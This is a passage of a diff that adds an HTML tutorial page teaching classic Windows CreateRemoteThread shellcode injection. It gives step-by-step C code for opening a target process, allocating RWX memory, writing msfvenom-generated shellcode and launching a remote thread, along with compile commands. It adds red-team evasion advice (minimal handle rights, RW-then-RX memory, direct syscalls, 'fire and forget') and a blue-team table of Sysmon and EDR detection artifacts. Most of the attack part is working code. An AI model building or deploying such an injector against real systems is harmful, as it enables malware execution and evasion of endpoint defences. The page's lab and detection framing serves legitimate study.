+                    );
+                </div>
+                <table class="api-params">
+                    <thead><tr><th>Parameter</th><th>Type</th><th>Description</th></tr></thead>
+                    <tbody>
+                        <tr><td>dwFlags</td><td>DWORD</td><td><code>TH32CS_SNAPPROCESS</code> — include all processes. Other flags: <code>TH32CS_SNAPTHREAD</code>, <code>TH32CS_SNAPMODULE</code>.</td></tr>
+                        <tr><td>th32ProcessID</td><td>DWORD</td><td>Pass <code>0</code> to snapshot all processes system-wide.</td></tr>
+                        <tr><td><em>Returns</em></td><td>HANDLE</td><td>Valid handle on success. <code>INVALID_HANDLE_VALUE</code> on failure. Must be closed with <code>CloseHandle</code>.</td></tr>
+                    </tbody>
+                </table>
+                <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" target="_blank" rel="noopener" class="api-msdn">
+                    <svg width="12" height="12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
+                    MSDN Documentation ↗
+                </a>
+            </div>
+        </div>
+
+        <!-- API Reference: Process32First / Process32Next -->
+        <div class="api-ref">
+            <div class="api-ref-header">
+                <span>WIN32 API</span>
+                <span class="api-name">Process32First / Process32Next</span>
+            </div>
+            <div class="api-ref-body">
+                <div class="api-ref-sig">
+                    <span class="ret">BOOL</span> <span class="fname">Process32First</span>(<span class="param-type">HANDLE</span> <span class="param-name">hSnapshot</span>, <span class="param-type">LPPROCESSENTRY32</span> <span class="param-name">lppe</span>);<br>
+                    <span class="ret">BOOL</span> <span class="fname">Process32Next</span>(<span class="param-type">HANDLE</span> <span class="param-name">hSnapshot</span>, <span class="param-type">LPPROCESSENTRY32</span> <span class="param-name">lppe</span>);
+                </div>
+                <p style="font-family:'Fira Code',monospace;font-size:12px;color:var(--text-dim);margin:8px 0 12px;">
+                    <code>Process32First</code> retrieves the first entry from the snapshot and fills <code>lppe</code>. <code>Process32Next</code> advances to the next. Returns <code>FALSE</code> when the list is exhausted — that's the loop termination condition. The <code>szExeFile</code> field of <code>PROCESSENTRY32</code> holds the executable name (e.g. <code>"notepad.exe"</code>).
+                </p>
+                <a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first" target="_blank" rel="noopener" class="api-msdn">
+                    <svg width="12" height="12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
+                    MSDN Documentation ↗
+                </a>
+            </div>
+        </div>
+
+        <blockquote>
+            <strong>Red team note:</strong> Calling <code>CreateToolhelp32Snapshot</code> generates a kernel event that EDRs monitor. More advanced tradecraft uses <code>NtQuerySystemInformation</code> with <code>SystemProcessInformation</code> via direct syscall to enumerate processes without touching the Toolhelp API at all.
+        </blockquote>
+
+        <!-- ═══════════════════════════════════════════ -->
+        <h2 id="step2">Step 2 — Opening the Target Process</h2>
+
+        <div class="step-badge"><span class="sn">02</span> ACQUIRE A PROCESS HANDLE</div>
+
+        <p>
+            With the PID in hand, the next step is acquiring a <strong>handle</strong> to that process — a kernel-managed reference object that lets us interact with it. The critical choice here is which access rights to request.
+        </p>
+
+        <div class="code-wrap">
+            <span class="code-label">C</span>
+            <button class="code-copy" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-c">// PROCESS_ALL_ACCESS grants every permission: read, write, execute, terminate, etc.
+// For a stealth injector you would request only:
+// PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD
+hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+
+if(hProcess == NULL) {
+    printf("Error opening process: %lu\n", GetLastError());
+    return 1;
+}</code></pre>
+        </div>
+
+        <p>
+            <code>PROCESS_ALL_ACCESS</code> is the "give me everything" flag. It works well in a lab but it's also maximally detectable — any EDR monitoring process handle grants will immediately flag this. In a real engagement, you request the <strong>minimum rights needed</strong>:
+        </p>
+
+        <table>
+            <thead><tr><th>Access Right</th><th>Required For</th></tr></thead>
+            <tbody>
+                <tr><td><code>PROCESS_VM_OPERATION</code></td><td><code>VirtualAllocEx</code> — allocating memory in the target</td></tr>
+                <tr><td><code>PROCESS_VM_WRITE</code></td><td><code>WriteProcessMemory</code> — writing shellcode bytes</td></tr>
+                <tr><td><code>PROCESS_CREATE_THREAD</code></td><td><code>CreateRemoteThread</code> — spawning the execution thread</td></tr>
+                <tr><td><code>PROCESS_VM_READ</code></td><td>Optional — reading back memory to verify the write</td></tr>
+            </tbody>
+        </table>
+
+        <!-- API Reference: OpenProcess -->
+        <div class="api-ref">
+            <div class="api-ref-header">
+                <span>WIN32 API</span>
+                <span class="api-name">OpenProcess</span>
+            </div>
+            <div class="api-ref-body">
+                <div class="api-ref-sig">
+                    <span class="ret">HANDLE</span> <span class="fname">OpenProcess</span>(<br>
+                    &nbsp;&nbsp;<span class="param-type">DWORD</span>  <span class="param-name">dwDesiredAccess</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">BOOL</span>   <span class="param-name">bInheritHandle</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">DWORD</span>  <span class="param-name">dwProcessId</span><br>
+                    );
+                </div>
+                <table class="api-params">
+                    <thead><tr><th>Parameter</th><th>Type</th><th>Description</th></tr></thead>
+                    <tbody>
+                        <tr><td>dwDesiredAccess</td><td>DWORD</td><td>Access rights bitmask. <code>PROCESS_ALL_ACCESS</code> or a combination of specific rights. The kernel will deny if your token doesn't have <code>SeDebugPrivilege</code> for protected processes.</td></tr>
+                        <tr><td>bInheritHandle</td><td>BOOL</td><td><code>FALSE</code> — the handle is not inherited by child processes. Usually false for injection.</td></tr>
+                        <tr><td>dwProcessId</td><td>DWORD</td><td>The PID of the target process obtained from enumeration.</td></tr>
+                        <tr><td><em>Returns</em></td><td>HANDLE</td><td>Non-null handle on success. <code>NULL</code> on failure — call <code>GetLastError()</code> for the reason (often <code>5 = ACCESS_DENIED</code>).</td></tr>
+                    </tbody>
+                </table>
+                <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" target="_blank" rel="noopener" class="api-msdn">
+                    <svg width="12" height="12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
+                    MSDN Documentation ↗
+                </a>
+            </div>
+        </div>
+
+        <!-- ═══════════════════════════════════════════ -->
+        <h2 id="step3">Step 3 — Allocating Remote Memory</h2>
+
+        <div class="step-badge"><span class="sn">03</span> CARVE OUT SPACE FOR THE PAYLOAD</div>
+
+        <p>
+            Now we have a handle. The shellcode needs somewhere to live inside the target process's virtual address space. <code>VirtualAllocEx</code> is the remote version of <code>VirtualAlloc</code> — it performs the allocation in another process rather than the calling one.
+        </p>
+
+        <div class="code-wrap">
+            <span class="code-label">C</span>
+            <button class="code-copy" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-c">SIZE_T PayloadSize = 1024;  // Allocate 1KB — enough for small shellcode payloads
+
+LPVOID RemoteBuffer = VirtualAllocEx(
+    hProcess,               // handle to target process
+    NULL,                   // let the OS choose the address (no preferred location)
+    PayloadSize,            // size in bytes to allocate
+    MEM_COMMIT | MEM_RESERVE,   // reserve VA range AND commit physical backing
+    PAGE_EXECUTE_READWRITE  // RWX: readable, writable, AND executable
+);
+
+if(RemoteBuffer == NULL) {
+    printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
+    CloseHandle(hProcess);
+    return 1;
+}
+printf("[+] Allocated remote buffer at: %p\n", RemoteBuffer);</code></pre>
+        </div>
+
+        <h3>MEM_COMMIT | MEM_RESERVE — what's the difference?</h3>
+
+        <p>
+            <strong><code>MEM_RESERVE</code></strong> stakes out a range in virtual address space — it claims the addresses, but no physical memory or pagefile space is committed yet. <strong><code>MEM_COMMIT</code></strong> backs the reserved range with actual memory pages. You need both together for a usable allocation. Using only <code>MEM_RESERVE</code> would give you addresses that fault immediately on access.
+        </p>
+
+        <h3>PAGE_EXECUTE_READWRITE — the loud flag</h3>
+
+        <p>
+            <code>PAGE_EXECUTE_READWRITE</code> (RWX) means the region can be read, written, and executed. For a lab this is fine. In a real engagement this is a screaming detection signal — allocating RWX memory in a remote process is one of the highest-confidence indicators of code injection monitored by every EDR on the market.
+        </p>
+
+        <p>
+            The stealthy approach is to use a two-step model: allocate as <code>PAGE_READWRITE</code>, write the shellcode, then change protection to <code>PAGE_EXECUTE_READ</code> using <code>VirtualProtectEx</code>. This is harder to detect because no page is ever simultaneously writable and executable.
+        </p>
+
+        <!-- API Reference: VirtualAllocEx -->
+        <div class="api-ref">
+            <div class="api-ref-header">
+                <span>WIN32 API</span>
+                <span class="api-name">VirtualAllocEx</span>
+            </div>
+            <div class="api-ref-body">
+                <div class="api-ref-sig">
+                    <span class="ret">LPVOID</span> <span class="fname">VirtualAllocEx</span>(<br>
+                    &nbsp;&nbsp;<span class="param-type">HANDLE</span>  <span class="param-name">hProcess</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">LPVOID</span>  <span class="param-name">lpAddress</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">SIZE_T</span>  <span class="param-name">dwSize</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">DWORD</span>   <span class="param-name">flAllocationType</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">DWORD</span>   <span class="param-name">flProtect</span><br>
+                    );
+                </div>
+                <table class="api-params">
+                    <thead><tr><th>Parameter</th><th>Type</th><th>Description</th></tr></thead>
+                    <tbody>
+                        <tr><td>hProcess</td><td>HANDLE</td><td>Handle to the target process with <code>PROCESS_VM_OPERATION</code> access.</td></tr>
+                        <tr><td>lpAddress</td><td>LPVOID</td><td>Desired base address hint. Pass <code>NULL</code> to let the OS choose.</td></tr>
+                        <tr><td>dwSize</td><td>SIZE_T</td><td>Number of bytes to allocate. Will be rounded up to the system page boundary (usually 4096 bytes).</td></tr>
+                        <tr><td>flAllocationType</td><td>DWORD</td><td><code>MEM_COMMIT | MEM_RESERVE</code> for a standard allocation.</td></tr>
+                        <tr><td>flProtect</td><td>DWORD</td><td>Page protection. <code>PAGE_EXECUTE_READWRITE</code> for lab use. Use <code>PAGE_READWRITE</code> + <code>VirtualProtectEx</code> for stealth.</td></tr>
+                        <tr><td><em>Returns</em></td><td>LPVOID</td><td>Base address of allocated region on success. <code>NULL</code> on failure.</td></tr>
+                    </tbody>
+                </table>
+                <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex" target="_blank" rel="noopener" class="api-msdn">
+                    <svg width="12" height="12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
+                    MSDN Documentation ↗
+                </a>
+            </div>
+        </div>
+
+        <!-- ═══════════════════════════════════════════ -->
+        <h2 id="step4">Step 4 — Generating Shellcode with msfvenom</h2>
+
+        <div class="step-badge"><span class="sn">04</span> BUILD THE PAYLOAD</div>
+
+        <p>
+            Shellcode is raw machine code — bytes that the CPU executes directly, with no loader, no imports, no file headers. It has to be <strong>position-independent</strong>: it can't rely on being at any specific address because we're placing it in whatever address <code>VirtualAllocEx</code> returned.
+        </p>
+
+        <p>
+            <strong>msfvenom</strong> is the payload generator from the Metasploit Framework. It handles all the complexity of building position-independent shellcode, applying encoders to remove bad characters, and outputting in the format you need.
+        </p>
+
+        <!-- msfvenom reference box -->
+        <div class="msfvenom-box">
+            <div class="msfvenom-header">
+                ⚙ MSFVENOM — SHELLCODE GENERATION REFERENCE
+            </div>
+            <div class="msfvenom-body">
+                <p style="font-family:'Fira Code',monospace;font-size:12px;color:var(--text-dim);margin-bottom:16px;">
+                    // Basic syntax: msfvenom -p &lt;payload&gt; [options] -b &lt;bad_chars&gt; -f &lt;format&gt;
+                </p>
+
+                <div class="code-wrap" style="margin-bottom:20px;">
+                    <span class="code-label">Bash</span>
+                    <button class="code-copy" onclick="copyCode(this)">copy</button>
+                    <pre><code class="language-bash"># The command used to generate the shellcode in this post:
+# Payload: windows/exec — executes a command on the target
+# CMD: the command to run (calc.exe, notepad.exe, cmd.exe, etc.)
+# -b '\x00' — remove null bytes (bad chars that break strlen-based size calculation)
+# -f c — output as a C-style char array (matches our const char* variable)
+msfvenom -p windows/exec CMD=calc.exe -b '\x00' -f c
+
+# Other useful payload examples:
+msfvenom -p windows/exec CMD=notepad.exe -b '\x00' -f c
+msfvenom -p windows/exec CMD=cmd.exe    -b '\x00' -f c
+
+# For a 64-bit target process, use the x64 payload variant:
+msfvenom -p windows/x64/exec CMD=calc.exe -b '\x00' -f c</code></pre>
+                </div>
+
+                <table class="msfvenom-flag-table">
+                    <thead><tr><th>Flag</th><th>What It Does</th><th>Example Values</th></tr></thead>
+                    <tbody>
+                        <tr><td>-p</td><td>Payload selection — the type of shellcode to generate</td><td><code>windows/exec</code>, <code>windows/x64/exec</code>, <code>windows/meterpreter/reverse_tcp</code></td></tr>
+                        <tr><td>CMD=</td><td>The command to execute (specific to <code>windows/exec</code> payload)</td><td><code>calc.exe</code>, <code>notepad.exe</code>, <code>cmd.exe /k whoami</code></td></tr>
+                        <tr><td>-b</td><td>Bad characters to exclude from the shellcode. The encoder rewrites bytes to avoid these.</td><td><code>'\x00'</code> (null), <code>'\x0a\x0d'</code> (newline+CR), <code>'\x00\xff'</code></td></tr>
+                        <tr><td>-f</td><td>Output format — how the shellcode bytes are formatted in the output file</td><td><code>c</code> (C array), <code>python</code>, <code>raw</code>, <code>hex</code>, <code>exe</code></td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <h3>Why remove null bytes with <code>-b '\x00'</code>?</h3>
+
+        <p>
+            The code uses <code>strlen(MyPayload) + 1</code> to calculate shellcode size. <code>strlen</code> counts until it hits a <code>\x00</code> (null terminator). If the shellcode contains a null byte anywhere in the middle, <code>strlen</code> stops early and <code>WriteProcessMemory</code> copies an incomplete payload — resulting in a crash or silent failure. The <code>-b '\x00'</code> flag tells msfvenom's encoder to rewrite the shellcode so no null bytes appear in the final output.
+        </p>
+
+        <div class="callout callout-tip">
+            <div class="callout-title">// BETTER PRACTICE</div>
+            Instead of relying on <code>strlen</code> — which is fragile and only works on null-terminated shellcode — use a fixed-size byte array: <code>unsigned char MyPayload[] = { ... };</code> and pass <code>sizeof(MyPayload)</code> to <code>WriteProcessMemory</code>. This works correctly regardless of embedded null bytes.
+        </div>
+
+        <!-- ═══════════════════════════════════════════ -->
+        <h2 id="step5">Step 5 — Writing Shellcode with WriteProcessMemory</h2>
+
+        <div class="step-badge"><span class="sn">05</span> COPY THE PAYLOAD</div>
+
+        <p>
+            The memory is allocated. The shellcode is ready. Now we copy the bytes across process boundaries into the remote buffer using <code>WriteProcessMemory</code>.
+        </p>
+
+        <div class="code-wrap">
+            <span class="code-label">C</span>
+            <button class="code-copy" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-c">SIZE_T SizeofShellcode = strlen(MyPayload) + 1;
+
+BOOL isWritten = WriteProcessMemory(
+    hProcess,           // target process handle
+    RemoteBuffer,       // destination address INSIDE the target process
+    MyPayload,          // source buffer — shellcode bytes in OUR process
+    SizeofShellcode,    // number of bytes to copy
+    NULL                // optional: pointer to receive actual bytes written
+);
+
+if(!isWritten) {
+    printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
+    CloseHandle(hProcess);
+    return 1;
+}
+printf("[+] Shellcode written successfully!\n");</code></pre>
+        </div>
+
+        <p>
+            What's happening under the hood: <code>WriteProcessMemory</code> is a kernel operation that temporarily suspends page protection on the target region, performs the cross-process memory copy, then restores the protection. It's essentially the same mechanism used by debuggers to set software breakpoints. The kernel validates both addresses — source must be readable in our process, destination must be writable in the target.
+        </p>
+
+        <!-- API Reference: WriteProcessMemory -->
+        <div class="api-ref">
+            <div class="api-ref-header">
+                <span>WIN32 API</span>
+                <span class="api-name">WriteProcessMemory</span>
+            </div>
+            <div class="api-ref-body">
+                <div class="api-ref-sig">
+                    <span class="ret">BOOL</span> <span class="fname">WriteProcessMemory</span>(<br>
+                    &nbsp;&nbsp;<span class="param-type">HANDLE</span>  <span class="param-name">hProcess</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">LPVOID</span>  <span class="param-name">lpBaseAddress</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">LPCVOID</span> <span class="param-name">lpBuffer</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">SIZE_T</span>  <span class="param-name">nSize</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">SIZE_T*</span> <span class="param-name">lpNumberOfBytesWritten</span><br>
+                    );
+                </div>
+                <table class="api-params">
+                    <thead><tr><th>Parameter</th><th>Type</th><th>Description</th></tr></thead>
+                    <tbody>
+                        <tr><td>hProcess</td><td>HANDLE</td><td>Target process handle. Must have <code>PROCESS_VM_WRITE</code> and <code>PROCESS_VM_OPERATION</code> access.</td></tr>
+                        <tr><td>lpBaseAddress</td><td>LPVOID</td><td>Destination address in the target process's VA space — the value returned by <code>VirtualAllocEx</code>.</td></tr>
+                        <tr><td>lpBuffer</td><td>LPCVOID</td><td>Source buffer in the calling process containing the data to write (our shellcode).</td></tr>
+                        <tr><td>nSize</td><td>SIZE_T</td><td>Number of bytes to write.</td></tr>
+                        <tr><td>lpNumberOfBytesWritten</td><td>SIZE_T*</td><td>Optionally receives how many bytes were actually written. Pass <code>NULL</code> to ignore.</td></tr>
+                        <tr><td><em>Returns</em></td><td>BOOL</td><td><code>TRUE</code> on success. <code>FALSE</code> on failure — check <code>GetLastError()</code>.</td></tr>
+                    </tbody>
+                </table>
+                <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory" target="_blank" rel="noopener" class="api-msdn">
+                    <svg width="12" height="12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
+                    MSDN Documentation ↗
+                </a>
+            </div>
+        </div>
+
+        <!-- ═══════════════════════════════════════════ -->
+        <h2 id="step6">Step 6 — Executing via CreateRemoteThread</h2>
+
+        <div class="step-badge"><span class="sn">06</span> PULL THE TRIGGER</div>
+
+        <p>
+            The shellcode is sitting in the target process's memory, waiting. <code>CreateRemoteThread</code> is the final step — it asks the OS to create a new execution thread inside the target process, starting at the address of our shellcode. From that point the payload is running as part of <code>notepad.exe</code>.
+        </p>
+
+        <div class="code-wrap">
+            <span class="code-label">C</span>
+            <button class="code-copy" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-c">HANDLE hThread = CreateRemoteThread(
+    hProcess,                              // target process
+    NULL,                                  // default security descriptor for the thread
+    0,                                     // default stack size
+    (LPTHREAD_START_ROUTINE)RemoteBuffer,  // start address = shellcode location
+    NULL,                                  // no parameter passed to thread function
+    0,                                     // thread runs immediately (not suspended)
+    NULL                                   // we don't need the thread ID
+);
+
+if(hThread == NULL) {
+    printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
+} else {
+    printf("[+] Remote thread executing shellcode...\n");
+    // Block until the thread finishes (calc.exe opens and closes)
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+}
+
+CloseHandle(hProcess);</code></pre>
+        </div>
+
+        <p>
+            The cast <code>(LPTHREAD_START_ROUTINE)RemoteBuffer</code> deserves attention. <code>LPTHREAD_START_ROUTINE</code> is the function pointer type for thread start routines — <code>DWORD WINAPI ThreadProc(LPVOID lpParameter)</code>. Our shellcode obviously doesn't have that signature, but the cast tells the compiler to treat the address as if it does. The CPU doesn't know or care — it will jump to that address and start executing whatever bytes are there.
+        </p>
+
+        <p>
+            <code>WaitForSingleObject(hThread, INFINITE)</code> blocks our injector process until the remote thread finishes. For a calc.exe payload that means waiting until the calculator closes. In real tooling you wouldn't wait — you'd fire and forget, immediately closing all handles to reduce your footprint.
+        </p>
+
+        <!-- API Reference: CreateRemoteThread -->
+        <div class="api-ref">
+            <div class="api-ref-header">
+                <span>WIN32 API</span>
+                <span class="api-name">CreateRemoteThread</span>
+            </div>
+            <div class="api-ref-body">
+                <div class="api-ref-sig">
+                    <span class="ret">HANDLE</span> <span class="fname">CreateRemoteThread</span>(<br>
+                    &nbsp;&nbsp;<span class="param-type">HANDLE</span>                  <span class="param-name">hProcess</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">LPSECURITY_ATTRIBUTES</span>   <span class="param-name">lpThreadAttributes</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">SIZE_T</span>                  <span class="param-name">dwStackSize</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">LPTHREAD_START_ROUTINE</span>  <span class="param-name">lpStartAddress</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">LPVOID</span>                  <span class="param-name">lpParameter</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">DWORD</span>                   <span class="param-name">dwCreationFlags</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">LPDWORD</span>                 <span class="param-name">lpThreadId</span><br>
+                    );
+                </div>
+                <table class="api-params">
+                    <thead><tr><th>Parameter</th><th>Type</th><th>Description</th></tr></thead>
+                    <tbody>
+                        <tr><td>hProcess</td><td>HANDLE</td><td>Target process. Must have <code>PROCESS_CREATE_THREAD</code>, <code>PROCESS_VM_OPERATION</code>, and <code>PROCESS_VM_WRITE</code> access.</td></tr>
+                        <tr><td>lpThreadAttributes</td><td>LPSECURITY_ATTRIBUTES</td><td>Security descriptor for the new thread. <code>NULL</code> = default.</td></tr>
+                        <tr><td>dwStackSize</td><td>SIZE_T</td><td>Initial stack size. <code>0</code> = use the target's default stack size.</td></tr>
+                        <tr><td>lpStartAddress</td><td>LPTHREAD_START_ROUTINE</td><td><strong>The address the thread starts executing.</strong> We pass the address of our shellcode in the remote process.</td></tr>
+                        <tr><td>lpParameter</td><td>LPVOID</td><td>Single argument passed to the thread function. <code>NULL</code> for shellcode (it doesn't use parameters).</td></tr>
+                        <tr><td>dwCreationFlags</td><td>DWORD</td><td><code>0</code> = start immediately. <code>CREATE_SUSPENDED</code> = create suspended, then resume with <code>ResumeThread</code>.</td></tr>
+                        <tr><td>lpThreadId</td><td>LPDWORD</td><td>Receives the new thread ID. Pass <code>NULL</code> to ignore.</td></tr>
+                        <tr><td><em>Returns</em></td><td>HANDLE</td><td>Handle to the new thread, or <code>NULL</code> on failure.</td></tr>
+                    </tbody>
+                </table>
+                <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread" target="_blank" rel="noopener" class="api-msdn">
+                    <svg width="12" height="12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
+                    MSDN Documentation ↗
+                </a>
+            </div>
+        </div>
+
+        <!-- ═══════════════════════════════════════════ -->
+        <h2 id="compile">Compiling with GCC / MinGW</h2>
+
+        <p>
+            This code targets the Windows API so it must be compiled with a Windows-compatible compiler. <strong>MinGW-w64</strong> (Minimalist GNU for Windows) provides GCC with the full Win32 SDK headers and libraries. You can compile natively on Windows or cross-compile from Linux.
+        </p>
+
+        <h3>On Windows (MinGW-w64 installed)</h3>
+
+        <div class="code-wrap">
+            <span class="code-label">Bash / CMD</span>
+            <button class="code-copy" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-bash"># 32-bit target (x86) — matches windows/exec payload (no /x64)
+gcc basic-process-injector.c -o injector32.exe -m32
+
+# 64-bit target (x86_64) — matches windows/x64/exec payload
+gcc basic-process-injector.c -o injector64.exe -m64
+
+# If compilation gives linker errors for Win32 APIs, add the library flags explicitly:
+gcc basic-process-injector.c -o injector.exe -m64 -lkernel32 -luser32
+
+# Optional: strip debug symbols to reduce binary size
+gcc basic-process-injector.c -o injector.exe -m64 -s</code></pre>
+        </div>
+
+        <h3>Cross-compiling from Linux (Kali / Parrot)</h3>
+
+        <div class="code-wrap">
+            <span class="code-label">Bash</span>
+            <button class="code-copy" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-bash"># Install MinGW cross-compiler on Debian/Kali/Ubuntu:
+sudo apt install mingw-w64 -y
+
+# Cross-compile for 64-bit Windows from Linux:
+x86_64-w64-mingw32-gcc basic-process-injector.c -o injector64.exe
+
+# Cross-compile for 32-bit Windows from Linux:
+i686-w64-mingw32-gcc basic-process-injector.c -o injector32.exe
+
+# With explicit library linkage if needed:
+x86_64-w64-mingw32-gcc basic-process-injector.c -o injector64.exe \
+    -lkernel32 -luser32 -static-libgcc</code></pre>
+        </div>
+
+        <div class="callout callout-warn">
+            <div class="callout-title">// 32-BIT vs 64-BIT MATTERS</div>
+            The shellcode architecture must match the target process architecture. A 32-bit shellcode (<code>windows/exec</code>) injected into a 64-bit process (<code>notepad.exe</code> on a 64-bit Windows) will crash immediately. Use <code>windows/x64/exec</code> for 64-bit targets and compile with <code>-m64</code>. To check: <code>notepad.exe</code> on 64-bit Windows is a 64-bit process. <code>notepad.exe</code> in <code>C:\Windows\SysWOW64\</code> is the 32-bit version.
+        </div>
+
+        <h3>Verify compilation succeeded</h3>
+
+        <div class="code-wrap">
+            <span class="code-label">Bash</span>
+            <button class="code-copy" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-bash"># Check the output binary architecture:
+file injector64.exe
+# Expected: PE32+ executable (console) x86-64
+
+file injector32.exe
+# Expected: PE32 executable (console) Intel 80386</code></pre>
+        </div>
+
+        <!-- ═══════════════════════════════════════════ -->
+        <h2 id="detection">Detection & Blue Team Notes</h2>
+
+        <p>
+            Every step of CreateRemoteThread injection leaves artifacts. Understanding what they are is essential for building detection and for evolving the technique toward better evasion.
+        </p>
+
+        <table>
+            <thead><tr><th>Action</th><th>Detection Artifact</th><th>Monitoring Method</th></tr></thead>
+            <tbody>
+                <tr><td><code>CreateToolhelp32Snapshot</code></td><td>Process opens a handle to the system process list</td><td>ETW — <code>Microsoft-Windows-Kernel-Process</code> provider</td></tr>
+                <tr><td><code>OpenProcess(PROCESS_ALL_ACCESS)</code></td><td>Excessive access rights on handle creation</td><td>Event ID 4656 (Object Access) · EDR handle telemetry</td></tr>
+                <tr><td><code>VirtualAllocEx(PAGE_EXECUTE_READWRITE)</code></td><td>RWX allocation in a foreign process</td><td>EDR memory allocation callbacks · <code>NtAllocateVirtualMemory</code> hooks</td></tr>
+                <tr><td><code>WriteProcessMemory</code></td><td>Cross-process memory write</td><td>EDR VM write callbacks · <code>NtWriteVirtualMemory</code> hooks</td></tr>
+                <tr><td><code>CreateRemoteThread</code></td><td>Thread start address is not inside any loaded module</td><td>Event ID 8 (Sysmon) · EDR thread creation callbacks</td></tr>
+                <tr><td>Shellcode execution</td><td>Shellcode bytes in memory scan, anomalous RWX region</td><td>Sysmon Event ID 17/18 · memory scanner signatures</td></tr>
+            </tbody>
+        </table>
+
+        <div class="callout callout-danger">
+            <div class="callout-title">// THE LOUDEST SIGNAL</div>
+            <strong>Sysmon Event ID 8</strong> (CreateRemoteThread) is logged every time this technique is used without evasion. It records: the source process, the target process, the start address, and the start module — which will show as outside any loaded DLL when pointing to a raw shellcode allocation. This is one of the most reliable detections for this classic technique.
+        </div>
+
+        <!-- ═══════════════════════════════════════════ -->
+        <h2 id="next">What Comes Next</h2>
+
+        <p>
+            CreateRemoteThread injection is the foundation. Every technique that comes after it is an answer to the question: <em>"how do we do the same thing with fewer detection signals?"</em>
+        </p>
+
+        <ul>
+            <li><strong>APC Injection</strong> — Instead of creating a new thread, queue an Asynchronous Procedure Call to an <em>existing</em> thread in the target. Less noisy than spawning a new thread. Uses <code>QueueUserAPC</code> + alertable thread states.</li>
+            <li><strong>Early Bird APC</strong> — Create the target process in a suspended state, inject shellcode before any of its code runs, then resume. The shellcode executes before any security products have had a chance to initialize in that process.</li>
+            <li><strong>Thread Hijacking</strong> — Suspend an existing thread with <code>SuspendThread</code>, modify its instruction pointer via <code>SetThreadContext</code> to point at shellcode, then resume. No new threads created at all.</li>
+            <li><strong>Process Hollowing</strong> — Create a legitimate process suspended, unmap its image from memory, replace it with a malicious PE, fix up the entry point, and resume. The process list shows the legitimate name with malicious code.</li>
+            <li><strong>Direct Syscalls</strong> — Replace the Win32 API calls (<code>NtAllocateVirtualMemory</code>, <code>NtWriteVirtualMemory</code>, <code>NtCreateThreadEx</code>) with direct syscall invocations, bypassing user-land EDR hooks entirely.</li>
+        </ul>
+
+        <blockquote>
+            <strong>Key insight:</strong> The detection problem for defenders is that the underlying kernel operations for all these techniques are identical — allocate memory, write bytes, redirect execution. What changes is which Win32 APIs are called, and therefore which hooks and callbacks fire. The most advanced techniques avoid user-land APIs entirely.
+        </blockquote>
+
+        <div class="callout callout-tip">
+            <div class="callout-title">// TAKEAWAY</div>
+            Build this, compile it, run it in a VM against a Sysmon-instrumented lab and watch the Event IDs fire. The best way to understand what a detection catches is to trigger it yourself and read the log. Then modify one step at a time and see which events disappear.
+        </div>
+
+        <hr>
+
